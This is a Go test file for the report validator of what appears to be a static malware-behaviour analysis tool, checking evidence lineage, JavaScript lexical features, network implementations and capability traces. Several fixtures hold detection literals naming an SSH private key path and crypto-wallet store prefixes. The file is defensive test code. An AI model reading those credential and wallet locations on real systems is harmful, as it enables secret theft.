package report

import (
	"bytes"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestValidateReportReferencesAcceptsConnectedReport(t *testing.T) {
	if err := validateReportReferences(connectedReferenceReport()); err != nil {
		t.Fatalf("validateReportReferences() error = %v", err)
	}
	rep := connectedReferenceReport()
	rep.AnalysisSelection[0].Reasons = []behavior.SelectionReason{behavior.SelectionReasonDeclaredEntry}
	if err := validateReportReferences(rep); err != nil {
		t.Fatalf("declared-entry-candidate selection was rejected: %v", err)
	}
}

func TestXcodeBaseConfigurationEvidenceCompatibilityRequiresBoundAbsenceProof(t *testing.T) {
	evidence := map[string]behavior.Evidence{
		"ev-reference": {
			ID:     "ev-reference",
			NodeID: "node-project",
			Method: "xcode-project",
			Kind:   "xcode-base-configuration-reference",
			Value:  "target configuration Debug [DEBUG] baseConfigurationReference CONFIG -> Pods/Debug.xcconfig",
		},
		"ev-xcconfig": {
			ID:     "ev-xcconfig",
			NodeID: "node-xcconfig",
			Method: "xcode-xcconfig",
			Kind:   "xcode-build-setting-absence",
			Value:  "PAYLOAD is not assigned and no unsupported '#' marker is present",
		},
	}
	valid := []artifact.Edge{{
		From:        "node-project",
		To:          "node-xcconfig",
		Kind:        "xcode-base-configuration",
		EvidenceIDs: []string{"ev-reference", "ev-xcconfig"},
	}}
	if !xcodeBaseConfigurationEvidenceNodeCompatible("node-project", "ev-xcconfig", evidence, valid) {
		t.Fatal("exact project-to-base-configuration absence proof was rejected")
	}

	tests := []struct {
		name           string
		mutateEvidence func(map[string]behavior.Evidence)
		relationships  []artifact.Edge
	}{
		{name: "missing relationship"},
		{name: "missing reference proof", relationships: []artifact.Edge{{From: "node-project", To: "node-xcconfig", Kind: "xcode-base-configuration", EvidenceIDs: []string{"ev-xcconfig"}}}},
		{name: "wrong direction", relationships: []artifact.Edge{{From: "node-xcconfig", To: "node-project", Kind: "xcode-base-configuration", EvidenceIDs: []string{"ev-reference", "ev-xcconfig"}}}},
		{name: "wrong kind", relationships: []artifact.Edge{{From: "node-project", To: "node-xcconfig", Kind: "contains", EvidenceIDs: []string{"ev-reference", "ev-xcconfig"}}}},
		{name: "unbound evidence", relationships: []artifact.Edge{{From: "node-project", To: "node-xcconfig", Kind: "xcode-base-configuration"}}},
		{name: "wrong evidence value", relationships: valid, mutateEvidence: func(items map[string]behavior.Evidence) {
			item := items["ev-xcconfig"]
			item.Value = "PAYLOAD was not observed"
			items["ev-xcconfig"] = item
		}},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			items := map[string]behavior.Evidence{
				"ev-reference": evidence["ev-reference"],
				"ev-xcconfig":  evidence["ev-xcconfig"],
			}
			if test.mutateEvidence != nil {
				test.mutateEvidence(items)
			}
			if xcodeBaseConfigurationEvidenceNodeCompatible("node-project", "ev-xcconfig", items, test.relationships) {
				t.Fatalf("unsupported cross-file proof was accepted: evidence=%#v relationships=%#v", items, test.relationships)
			}
		})
	}
}

func TestValidateReportReferencesRejectsNegativeEvidenceCoordinates(t *testing.T) {
	for _, test := range []struct {
		name   string
		want   string
		mutate func(*behavior.Evidence)
	}{
		{name: "line", want: "line must not be negative", mutate: func(item *behavior.Evidence) { item.Line = -1 }},
		{name: "byte offset", want: "byte_offset must not be negative", mutate: func(item *behavior.Evidence) {
			item.Offset = -1
			item.OffsetKnown = true
		}},
	} {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedReferenceReport()
			test.mutate(&rep.Evidence[0])
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

func TestValidateReportReferencesRequiresFunctionScopeIdentity(t *testing.T) {
	for _, test := range []struct {
		name   string
		want   string
		mutate func(*behavior.Scope)
	}{
		{name: "missing identity", want: "function must not be empty", mutate: func(scope *behavior.Scope) { scope.Function = "" }},
		{name: "identity on non-function scope", want: "function requires kind", mutate: func(scope *behavior.Scope) { scope.Kind = "program" }},
	} {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedReferenceReport()
			test.mutate(&rep.Scopes[1])
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

func TestValidateReportReferencesRejectsArtifactParentCycles(t *testing.T) {
	for _, test := range []struct {
		name   string
		mutate func(*Report)
	}{
		{name: "self parent", mutate: func(rep *Report) {
			rep.ArtifactNodes[0].ParentID = "node-root"
		}},
		{name: "multi-node cycle", mutate: func(rep *Report) {
			rep.ArtifactNodes[0].ParentID = "node-child"
		}},
	} {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedReferenceReport()
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, "artifact node parent graph contains a cycle")
		})
	}
}

func TestValidateReportReferencesRequiresNodeOwnedReferencedEvidence(t *testing.T) {
	tests := []struct {
		name   string
		mutate func(*Report, string)
	}{
		{name: "relationship", mutate: func(rep *Report, id string) { rep.Relationships[0].EvidenceIDs = []string{id} }},
		{name: "execution root", mutate: func(rep *Report, id string) { rep.ExecutionRoots[0].EvidenceIDs = []string{id} }},
		{name: "invoked target", mutate: func(rep *Report, id string) { rep.InvokedTargets[0].EvidenceIDs = []string{id} }},
		{name: "feature", mutate: func(rep *Report, id string) { rep.Features[0].EvidenceIDs = []string{id} }},
		{name: "operation", mutate: func(rep *Report, id string) { rep.Operations[0].EvidenceIDs = []string{id} }},
		{name: "resource binding", mutate: func(rep *Report, id string) { rep.Operations[0].ResourceBindings[0].EvidenceIDs = []string{id} }},
		{name: "operation relation", mutate: func(rep *Report, id string) { rep.OperationRelations[0].EvidenceIDs = []string{id} }},
		{name: "artifact property", mutate: func(rep *Report, id string) { rep.ArtifactProperties[0].EvidenceIDs = []string{id} }},
		{name: "network observation", mutate: func(rep *Report, id string) { rep.NetworkImplementations[0].EvidenceIDs = []string{id} }},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedRelationReport()
			const evidenceID = "ev-node-less"
			rep.Evidence = append(rep.Evidence, behavior.Evidence{
				ID: evidenceID, Method: "fixture", Kind: "same-context-lookalike",
				Arch: "arm64",
			})
			test.mutate(&rep, evidenceID)
			assertValidationErrorContains(t, rep, "without a node_id")
		})
	}
}

func TestValidateReportReferencesRequiresTypedCrossNodeEvidenceLineage(t *testing.T) {
	appendSiblingEvidence := func(rep *Report) string {
		rep.ArtifactNodes = append(rep.ArtifactNodes, artifact.Node{
			ID: "node-sibling", ParentID: "node-root", LogicalPath: "sample!sibling", Kind: "text", AnalyzeStatus: "analyzed",
		})
		rep.Evidence = append(rep.Evidence, behavior.Evidence{
			ID: "ev-sibling", NodeID: "node-sibling", Logical: "sample!sibling", Method: "fixture", Kind: "literal",
		})
		return "ev-sibling"
	}
	for _, test := range []struct {
		name   string
		want   string
		mutate func(*Report, string)
	}{
		{name: "feature", want: "not structurally related", mutate: func(rep *Report, id string) { rep.Features[0].EvidenceIDs = append(rep.Features[0].EvidenceIDs, id) }},
		{name: "operation", want: "not structurally related", mutate: func(rep *Report, id string) {
			rep.Operations[0].EvidenceIDs = append(rep.Operations[0].EvidenceIDs, id)
		}},
		{name: "resource binding", want: "not structurally related", mutate: func(rep *Report, id string) { rep.Operations[0].ResourceBindings[0].EvidenceIDs = []string{id} }},
		{name: "network observation", want: "not structurally related", mutate: func(rep *Report, id string) {
			rep.NetworkImplementations[0].EvidenceIDs = append(rep.NetworkImplementations[0].EvidenceIDs, id)
		}},
		{name: "artifact property", want: "not containment-related", mutate: func(rep *Report, id string) {
			rep.ArtifactProperties[0].EvidenceIDs = append(rep.ArtifactProperties[0].EvidenceIDs, id)
		}},
	} {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedReferenceReport()
			id := appendSiblingEvidence(&rep)
			test.mutate(&rep, id)
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

func TestValidateReportReferencesRejectsContainmentAloneAsSemanticEvidenceLineage(t *testing.T) {
	for _, location := range []struct {
		name     string
		node     artifact.Node
		evidence behavior.Evidence
	}{
		{
			name:     "ancestor",
			evidence: behavior.Evidence{ID: "ev-foreign", NodeID: "node-root", Logical: "sample", Method: "fixture", Kind: "literal"},
		},
		{
			name:     "descendant",
			node:     artifact.Node{ID: "node-grandchild", ParentID: "node-child", LogicalPath: "sample!payload!metadata", Kind: "text", AnalyzeStatus: "analyzed"},
			evidence: behavior.Evidence{ID: "ev-foreign", NodeID: "node-grandchild", Logical: "sample!payload!metadata", Method: "fixture", Kind: "literal"},
		},
	} {
		for _, plane := range []struct {
			name   string
			mutate func(*Report)
		}{
			{name: "feature", mutate: func(rep *Report) { rep.Features[0].EvidenceIDs = []string{"ev-foreign"} }},
			{name: "operation", mutate: func(rep *Report) { rep.Operations[0].EvidenceIDs = []string{"ev-foreign"} }},
			{name: "resource binding", mutate: func(rep *Report) { rep.Operations[0].ResourceBindings[0].EvidenceIDs = []string{"ev-foreign"} }},
			{name: "network observation", mutate: func(rep *Report) { rep.NetworkImplementations[0].EvidenceIDs = []string{"ev-foreign"} }},
		} {
			t.Run(location.name+"/"+plane.name, func(t *testing.T) {
				rep := connectedReferenceReport()
				if location.node.ID != "" {
					rep.ArtifactNodes = append(rep.ArtifactNodes, location.node)
				}
				rep.Evidence = append(rep.Evidence, location.evidence)
				plane.mutate(&rep)
				assertValidationErrorContains(t, rep, "not structurally related")
			})
		}
	}
}

func TestValidateReportReferencesAllowsOnlyTypedPackagingProjectionFromDescendant(t *testing.T) {
	fixture := func() Report {
		rep := connectedReferenceReport()
		rep.ArtifactNodes[0].PackagingTechnology = "Platypus"
		rep.ArtifactNodes = append(rep.ArtifactNodes, artifact.Node{
			ID: "node-settings", ParentID: "node-root", LogicalPath: "sample!settings", Kind: "plist", AnalyzeStatus: "analyzed",
		})
		rep.Evidence = append(rep.Evidence, behavior.Evidence{
			ID: "ev-packaging", NodeID: "node-settings", Logical: "sample!settings",
			Method: "facade-recognizer", Kind: "platypus-creator", Value: "Platypus",
		})
		rep.Features = append(rep.Features, behavior.Feature{
			ID: "feature-packaging", NodeID: "node-root", Key: "artifact.packaging_technology", Value: "Platypus",
			EvidenceIDs: []string{"ev-packaging"}, Support: behavior.SupportCorroborated,
			Execution: behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown},
		})
		return rep
	}
	assertValidReport(t, fixture())

	for _, test := range []struct {
		name   string
		mutate func(*Report)
	}{
		{name: "untyped evidence", mutate: func(rep *Report) { rep.Evidence[len(rep.Evidence)-1].Method = "fixture" }},
		{name: "node value disagreement", mutate: func(rep *Report) { rep.ArtifactNodes[0].PackagingTechnology = "Tauri" }},
		{name: "ancestor proof", mutate: func(rep *Report) {
			rep.ArtifactNodes[1].PackagingTechnology = "Platypus"
			rep.Features[len(rep.Features)-1].NodeID = "node-child"
			rep.Evidence[len(rep.Evidence)-1].NodeID = "node-root"
		}},
	} {
		t.Run(test.name, func(t *testing.T) {
			rep := fixture()
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, "not structurally related")
		})
	}
}

func TestValidateReportReferencesAcceptsInvocationEvidenceFromMetadataSibling(t *testing.T) {
	rep := connectedReferenceReport()
	rep.ArtifactNodes = append(rep.ArtifactNodes, artifact.Node{
		ID: "node-settings", ParentID: "node-root", LogicalPath: "sample!settings", Kind: "plist", AnalyzeStatus: "analyzed",
	})
	rep.Evidence = append(rep.Evidence, behavior.Evidence{
		ID: "ev-invocation", NodeID: "node-settings", Logical: "sample!settings", Method: "artifact-structure", Kind: "interpreter", Value: "/bin/sh",
	})
	rep.InvokedTargets[0].EvidenceIDs = append(rep.InvokedTargets[0].EvidenceIDs, "ev-invocation")
	rep.InvokedTargets[0].Source = behavior.EntityRef{Kind: behavior.EntityKindArtifactNode, ID: "node-root"}
	rep.InvokedTargets[0].Kind = "bundle-script"
	rep.Relationships = append(rep.Relationships,
		artifact.Edge{From: "node-root", To: "node-child", Kind: "bundle-script"},
		artifact.Edge{From: "node-root", To: "node-child", Kind: "bundle-executable"},
	)
	rep.Features[0].EvidenceIDs = append(rep.Features[0].EvidenceIDs, "ev-invocation")
	rep.Operations[0].EvidenceIDs = append(rep.Operations[0].EvidenceIDs, "ev-invocation")
	rep.Operations[0].ResourceBindings[0].EvidenceIDs = []string{"ev-1", "ev-invocation"}
	rep.NetworkImplementations[0].EvidenceIDs = append(rep.NetworkImplementations[0].EvidenceIDs, "ev-invocation")
	assertValidReport(t, rep)
}

func TestValidateReportReferencesRejectsInvocationMetadataAsSoleSemanticProof(t *testing.T) {
	fixture := func() Report {
		rep := connectedReferenceReport()
		rep.ArtifactNodes = append(rep.ArtifactNodes, artifact.Node{
			ID: "node-settings", ParentID: "node-root", LogicalPath: "sample!settings", Kind: "plist", AnalyzeStatus: "analyzed",
		})
		rep.Evidence = append(rep.Evidence, behavior.Evidence{
			ID: "ev-invocation", NodeID: "node-settings", Logical: "sample!settings", Method: "artifact-structure", Kind: "interpreter", Value: "/bin/sh",
		})
		rep.InvokedTargets[0].EvidenceIDs = append(rep.InvokedTargets[0].EvidenceIDs, "ev-invocation")
		rep.InvokedTargets[0].Source = behavior.EntityRef{Kind: behavior.EntityKindArtifactNode, ID: "node-root"}
		rep.InvokedTargets[0].Kind = "bundle-script"
		rep.Relationships = append(rep.Relationships,
			artifact.Edge{From: "node-root", To: "node-child", Kind: "bundle-script"},
			artifact.Edge{From: "node-root", To: "node-child", Kind: "bundle-executable"},
		)
		return rep
	}
	for _, test := range []struct {
		name   string
		mutate func(*Report)
	}{
		{name: "feature", mutate: func(rep *Report) { rep.Features[0].EvidenceIDs = []string{"ev-invocation"} }},
		{name: "operation", mutate: func(rep *Report) { rep.Operations[0].EvidenceIDs = []string{"ev-invocation"} }},
		{name: "resource binding", mutate: func(rep *Report) { rep.Operations[0].ResourceBindings[0].EvidenceIDs = []string{"ev-invocation"} }},
		{name: "network observation", mutate: func(rep *Report) { rep.NetworkImplementations[0].EvidenceIDs = []string{"ev-invocation"} }},
	} {
		t.Run(test.name, func(t *testing.T) {
			rep := fixture()
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, "requires same-node exact-context semantic evidence")
		})
	}
}

func TestValidateReportReferencesRejectsUnrelatedRootForArtifactSourcedTarget(t *testing.T) {
	rep := connectedReferenceReport()
	rep.InvokedTargets[0].Source = behavior.EntityRef{Kind: behavior.EntityKindArtifactNode, ID: "node-root"}
	rep.InvokedTargets[0].Kind = "bundle-script"
	rep.Relationships = append(rep.Relationships,
		artifact.Edge{From: "node-root", To: "node-child", Kind: "bundle-script"},
		artifact.Edge{From: "node-root", To: "node-child", Kind: "bundle-executable"},
	)
	rep.ArtifactNodes = append(rep.ArtifactNodes, artifact.Node{
		ID: "node-unrelated", LogicalPath: "unrelated", Kind: "executable", AnalyzeStatus: "analyzed",
	})
	rep.Evidence = append(rep.Evidence, behavior.Evidence{
		ID: "ev-unrelated-root", NodeID: "node-unrelated", Logical: "unrelated", Method: "fixture", Kind: "root",
	})
	rep.ExecutionRoots = append(rep.ExecutionRoots, behavior.ExecutionRoot{
		ID: "root-unrelated", Kind: "fixture", DeclarationNodeID: "node-unrelated", StartNodeID: "node-unrelated", EvidenceIDs: []string{"ev-unrelated-root"},
	})
	rep.InvokedTargets[0].Execution.ExecutionRootIDs = []string{"root-unrelated"}
	assertValidationErrorContains(t, rep, "is not started by a bundle executable owned by artifact source")
}

func TestValidateReportReferencesRequiresExactArtifactTargetRelationship(t *testing.T) {
	for _, test := range []struct {
		name   string
		mutate func(*Report)
		want   string
	}{
		{name: "missing relationship", want: "lacks exact", mutate: func(rep *Report) {}},
		{name: "unsupported target kind", want: "unsupported for an artifact-node source", mutate: func(rep *Report) {
			rep.InvokedTargets[0].Kind = "fixture-target"
		}},
	} {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedReferenceReport()
			rep.InvokedTargets[0].Source = behavior.EntityRef{Kind: behavior.EntityKindArtifactNode, ID: "node-root"}
			rep.InvokedTargets[0].Kind = "bundle-script"
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

func TestValidateReportReferencesEnforcesJavaScriptLexicalFeatureContract(t *testing.T) {
	fixture := func() Report {
		rep := connectedReferenceReport()
		rep.Scopes[1].Function = "fixtureFunction"
		rep.Evidence = append(rep.Evidence, behavior.Evidence{
			ID: "ev-js", NodeID: "node-child", ScopeID: "scope-child",
			Logical: "sample!payload", Line: 4, Offset: 10, OffsetKnown: true,
			Arch: "arm64", Method: "javascript-lexical",
			Kind: "javascript-module-specifier", Value: "node:fs",
			Function: "fixtureFunction",
		})
		rep.Features = append(rep.Features, behavior.Feature{
			ID: "feature-js", NodeID: "node-child", ScopeID: "scope-child",
			Architecture: "arm64", Key: "javascript.module_specifier", Value: "node:fs",
			Qualifiers:  map[string]string{"form": "esm-import"},
			EvidenceIDs: []string{"ev-js"}, Support: behavior.SupportDirect,
			Execution:      behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown},
			SourceFunction: "fixtureFunction",
		})
		return rep
	}
	assertValidReport(t, fixture())
	reExport := fixture()
	reExport.Features[len(reExport.Features)-1].Qualifiers["form"] = "esm-re-export"
	assertValidReport(t, reExport)
	bundled := fixture()
	bundled.Features[len(bundled.Features)-1].Qualifiers["form"] = "bundled-commonjs-wrapper"
	assertValidReport(t, bundled)

	tests := []struct {
		name   string
		want   string
		mutate func(*Report)
	}{
		{name: "weak support", want: "support must be DIRECT", mutate: func(rep *Report) {
			rep.Features[len(rep.Features)-1].Support = behavior.SupportCorroborated
		}},
		{name: "execution ownership", want: "execution must remain UNKNOWN", mutate: func(rep *Report) {
			rep.Features[len(rep.Features)-1].Execution = behavior.ExecutionContext{
				Connectivity:     behavior.ConnectivityConnected,
				ExecutionRootIDs: []string{"root-1"},
				InvokedTargetIDs: []string{"target-1"},
			}
		}},
		{name: "evidence node", want: "must name a function scope", mutate: func(rep *Report) {
			rep.Evidence[len(rep.Evidence)-1].NodeID = "node-root"
			rep.Evidence[len(rep.Evidence)-1].ScopeID = "scope-root"
			rep.Evidence[len(rep.Evidence)-1].Arch = ""
		}},
		{name: "evidence function", want: "differs from scope function", mutate: func(rep *Report) {
			rep.Evidence[len(rep.Evidence)-1].Function = "other"
		}},
		{name: "evidence architecture", want: "requires same-node exact-context semantic evidence", mutate: func(rep *Report) {
			rep.Scopes[1].Architecture = ""
			rep.Evidence[len(rep.Evidence)-1].Arch = ""
		}},
		{name: "evidence method", want: "extraction_method", mutate: func(rep *Report) {
			rep.Evidence[len(rep.Evidence)-1].Method = "text"
		}},
		{name: "evidence kind", want: "evidence kind", mutate: func(rep *Report) {
			rep.Evidence[len(rep.Evidence)-1].Kind = "javascript-url-literal"
		}},
		{name: "evidence value", want: "differs from JavaScript lexical evidence matched_value", mutate: func(rep *Report) {
			rep.Evidence[len(rep.Evidence)-1].Value = "node:path"
		}},
		{name: "empty value", want: "value is incompatible with a bounded ordinary JavaScript literal", mutate: func(rep *Report) {
			rep.Features[len(rep.Features)-1].Value = ""
			rep.Evidence[len(rep.Evidence)-1].Value = ""
		}},
		{name: "escaped feature value", want: "value is incompatible with a bounded ordinary JavaScript literal", mutate: func(rep *Report) {
			rep.Features[len(rep.Features)-1].Value = `node:\fs`
			rep.Evidence[len(rep.Evidence)-1].Value = `node:\fs`
		}},
		{name: "oversized feature value", want: "value is incompatible with a bounded ordinary JavaScript literal", mutate: func(rep *Report) {
			value := strings.Repeat("a", maxJavaScriptLexicalValueBytes+1)
			rep.Features[len(rep.Features)-1].Value = value
			rep.Evidence[len(rep.Evidence)-1].Value = value
		}},
		{name: "oversized evidence value", want: "evidence matched_value is incompatible with a bounded ordinary JavaScript literal", mutate: func(rep *Report) {
			rep.Evidence[len(rep.Evidence)-1].Value = strings.Repeat("a", maxJavaScriptLexicalValueBytes+1)
		}},
		{name: "unknown offset", want: "exact line and byte_offset", mutate: func(rep *Report) {
			rep.Evidence[len(rep.Evidence)-1].Offset = 0
			rep.Evidence[len(rep.Evidence)-1].OffsetKnown = false
		}},
		{name: "negative offset", want: "byte_offset must not be negative", mutate: func(rep *Report) {
			rep.Evidence[len(rep.Evidence)-1].Offset = -1
		}},
		{name: "scope function", want: "differs from scope function", mutate: func(rep *Report) {
			rep.Scopes[1].Function = "otherFunction"
		}},
		{name: "non-function scope", want: "requires kind", mutate: func(rep *Report) {
			rep.Scopes[1].Kind = "artifact-node"
		}},
		{name: "invalid form", want: "invalid JavaScript module form", mutate: func(rep *Report) {
			rep.Features[len(rep.Features)-1].Qualifiers["form"] = "load"
		}},
		{name: "extra qualifier", want: "unsupported JavaScript module fields", mutate: func(rep *Report) {
			rep.Features[len(rep.Features)-1].Qualifiers["resolved"] = "true"
		}},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			rep := fixture()
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

func TestValidateReportReferencesIdentifiesJavaScriptSharedKeysFromEvidence(t *testing.T) {
	fixture := func() Report {
		rep := connectedReferenceReport()
		rep.Evidence = append(rep.Evidence, behavior.Evidence{
			ID: "ev-js-url", NodeID: "node-child",
			Logical: "sample!payload", Line: 7, Offset: 24, OffsetKnown: true,
			Method: "javascript-lexical", Kind: "javascript-url-literal",
			Value: "http://internal/payload",
		})
		rep.Features = append(rep.Features, behavior.Feature{
			ID: "feature-js-url", NodeID: "node-child",
			Key: "network.url", Value: "http://internal/payload",
			EvidenceIDs: []string{"ev-js-url"}, Support: behavior.SupportDirect,
			Execution: behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown},
		})
		return rep
	}
	assertValidReport(t, fixture())

	tests := []struct {
		name   string
		want   string
		mutate func(*Report)
	}{
		{name: "method relabel", want: "extraction_method", mutate: func(rep *Report) {
			rep.Evidence[len(rep.Evidence)-1].Method = "text"
		}},
		{name: "invalid URL", want: "exact supported JavaScript URL", mutate: func(rep *Report) {
			rep.Features[len(rep.Features)-1].Value = "not-a-url"
			rep.Evidence[len(rep.Evidence)-1].Value = "not-a-url"
		}},
		{name: "execution ownership", want: "must remain UNKNOWN", mutate: func(rep *Report) {
			rep.Features[len(rep.Features)-1].Execution = behavior.ExecutionContext{
				Connectivity:     behavior.ConnectivityConnected,
				ExecutionRootIDs: []string{"root-1"},
			}
		}},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			rep := fixture()
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

func TestValidateReportReferencesRequiresExactJavaScriptSensitiveLiteral(t *testing.T) {
	fixture := func() Report {
		rep := connectedReferenceReport()
		const value = "~/.ssh/id_ed25519"
		rep.Evidence = append(rep.Evidence, behavior.Evidence{
			ID: "ev-js-sensitive", NodeID: "node-child",
			Logical: "sample!payload", Line: 7, Offset: 24, OffsetKnown: true,
			Method: "javascript-lexical",
			Kind:   "javascript-sensitive-resource-literal",
			Value:  value,
		})
		rep.Features = append(rep.Features, behavior.Feature{
			ID: "feature-js-sensitive", NodeID: "node-child",
			Key: "script.sensitive_resource", Value: value,
			Qualifiers:  map[string]string{"category": "ssh-private-key"},
			EvidenceIDs: []string{"ev-js-sensitive"}, Support: behavior.SupportDirect,
			Execution: behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown},
		})
		return rep
	}
	assertValidReport(t, fixture())

	for _, test := range []struct {
		name     string
		value    string
		category string
	}{
		{
			name:     "URL collision",
			value:    "https://example.invalid/.ssh/id_ed25519",
			category: "ssh-private-key",
		},
		{
			name:     "prose collision",
			value:    "Documentation about .ssh/id_ed25519",
			category: "ssh-private-key",
		},
		{
			name:     "path-like prose prefix",
			value:    "Documentation/.ssh/id_ed25519 is secret",
			category: "ssh-private-key",
		},
		{
			name:     "absolute prose prefix",
			value:    "/documentation says .ssh/id_ed25519 is secret",
			category: "ssh-private-key",
		},
		{
			name:     "home prose prefix",
			value:    "~/documentation says .ssh/id_ed25519 is secret",
			category: "ssh-private-key",
		},
		{
			name:     "category mismatch",
			value:    "~/.ssh/id_ed25519",
			category: "keychain",
		},
		{
			name:     "electrum prefix collision",
			value:    "/tmp/.electrum-not-a-store",
			category: "crypto-wallet",
		},
		{
			name:     "metamask prefix collision",
			value:    "/tmp/.metamask-not-a-store",
			category: "crypto-wallet",
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			rep := fixture()
			rep.Features[len(rep.Features)-1].Value = test.value
			rep.Features[len(rep.Features)-1].Qualifiers["category"] = test.category
			rep.Evidence[len(rep.Evidence)-1].Value = test.value
			assertValidationErrorContains(t, rep, "exact sensitive path")
		})
	}
}

func TestValidateReportReferencesRejectsMalformedNetworkImplementations(t *testing.T) {
	tests := []struct {
		name   string
		want   string
		mutate func(*Report)
	}{
		{name: "unknown kind", want: "kind has invalid value", mutate: func(rep *Report) { rep.NetworkImplementations[0].Kind = "guess" }},
		{name: "missing identity", want: "api_or_tool must not be empty", mutate: func(rep *Report) { rep.NetworkImplementations[0].APIOrTool = "" }},
		{name: "import linked to operation", want: "incompatible with operation_ids presence", mutate: func(rep *Report) { rep.NetworkImplementations[0].Kind = behavior.NetworkImplementationAPIImport }},
		{name: "tool without operation", want: "incompatible with operation_ids presence", mutate: func(rep *Report) {
			rep.NetworkImplementations[0].Kind = behavior.NetworkImplementationToolInvocation
			rep.NetworkImplementations[0].OperationIDs = nil
		}},
		{name: "non-network operation", want: "non-network kind", mutate: func(rep *Report) { rep.NetworkImplementations[0].OperationIDs = []string{"operation-1"} }},
		{name: "mismatched subject", want: "differs from linked operation", mutate: func(rep *Report) {
			appendFixtureEvidence(rep, "ev-unscoped", "node-root", "", "arm64")
			rep.NetworkImplementations[0].SubjectNodeID = "node-root"
			rep.NetworkImplementations[0].ScopeID = ""
			rep.NetworkImplementations[0].Architecture = "arm64"
			rep.NetworkImplementations[0].Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}
			rep.NetworkImplementations[0].EvidenceIDs = []string{"ev-unscoped"}
		}},
		{name: "mismatched execution", want: "execution context differs", mutate: func(rep *Report) {
			rep.NetworkImplementations[0].Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}
		}},
		{name: "support strengthened", want: "is stronger than linked operation", mutate: func(rep *Report) { rep.NetworkImplementations[0].Support = behavior.SupportDirect }},
		{name: "standalone evidence architecture", want: "differs from evidence", mutate: func(rep *Report) {
			appendFixtureEvidence(rep, "ev-x86", "node-child", "", "x86_64")
			rep.NetworkImplementations[0].Kind = behavior.NetworkImplementationAPIImport
			rep.NetworkImplementations[0].OperationIDs = nil
			rep.NetworkImplementations[0].EvidenceIDs = []string{"ev-x86"}
		}},
		{name: "cross-function evidence", want: "differs from function evidence", mutate: func(rep *Report) {
			appendFixtureFunctionEvidence(rep, "ev-other-function", "other")
			rep.NetworkImplementations[0].EvidenceIDs = []string{"ev-other-function"}
		}},
		{name: "same-name different-scope evidence", want: "differs from function evidence", mutate: func(rep *Report) {
			appendFixtureSameNameScopeEvidence(rep, "ev-same-name")
			rep.NetworkImplementations[0].EvidenceIDs = []string{"ev-same-name"}
		}},
		{name: "unscoped function evidence", want: "differs from function evidence", mutate: func(rep *Report) {
			rep.NetworkImplementations[0].ScopeID = ""
			rep.NetworkImplementations[0].EvidenceIDs = []string{"ev-1"}
		}},
		{name: "provider without basis", want: "must either both be set", mutate: func(rep *Report) { rep.NetworkImplementations[0].TLSProvider = "Apple system TLS provider" }},
		{name: "basis without provider", want: "must either both be set", mutate: func(rep *Report) {
			rep.NetworkImplementations[0].TLSProviderBasis = behavior.TLSProviderBasisOperatingSystem
		}},
		{name: "unknown security property", want: "security_properties[0] has invalid value", mutate: func(rep *Report) {
			rep.NetworkImplementations[0].SecurityProperties = []behavior.NetworkSecurityProperty{"guess"}
		}},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedReferenceReport()
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

func TestValidateReportReferencesRejectsMalformedCapabilityMatchTrace(t *testing.T) {
	tests := []struct {
		name   string
		want   string
		mutate func(*Report)
	}{
		{name: "empty", want: "match_trace must not be empty", mutate: func(rep *Report) { rep.Capabilities[0].MatchTrace = nil }},
		{name: "unknown kind", want: "kind has invalid value", mutate: func(rep *Report) { rep.Capabilities[0].MatchTrace[0].Kind = "guess" }},
		{name: "invented path", want: "not generated by the closed rule expression vocabulary", mutate: func(rep *Report) { rep.Capabilities[0].MatchTrace[0].Path = "match.guess" }},
		{name: "wrong typed list", want: "exactly one typed fact ID list", mutate: func(rep *Report) { rep.Capabilities[0].MatchTrace[0].FeatureIDs = []string{"feature-1"} }},
		{name: "dangling fact", want: "references missing operation", mutate: func(rep *Report) { rep.Capabilities[0].MatchTrace[0].OperationIDs = []string{"missing"} }},
		{name: "missing supporting operation", want: "operation facts must equal", mutate: func(rep *Report) {
			rep.Capabilities[0].MatchTrace[0] = behavior.MatchTraceClause{Path: "match.each.right", Kind: behavior.MatchTraceFeature, FeatureIDs: []string{"feature-1"}}
		}},
		{name: "duplicate fact", want: "duplicates", mutate: func(rep *Report) {
			rep.Capabilities[0].MatchTrace[0].OperationIDs = []string{"operation-1", "operation-1"}
		}},
		{name: "noncanonical clause order", want: "canonical path and kind order", mutate: func(rep *Report) {
			rep.Capabilities[0].MatchTrace = []behavior.MatchTraceClause{
				{Path: "match.relate.right", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-1"}},
				{Path: "match.relate.left", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-1"}},
			}
		}},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedReferenceReport()
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

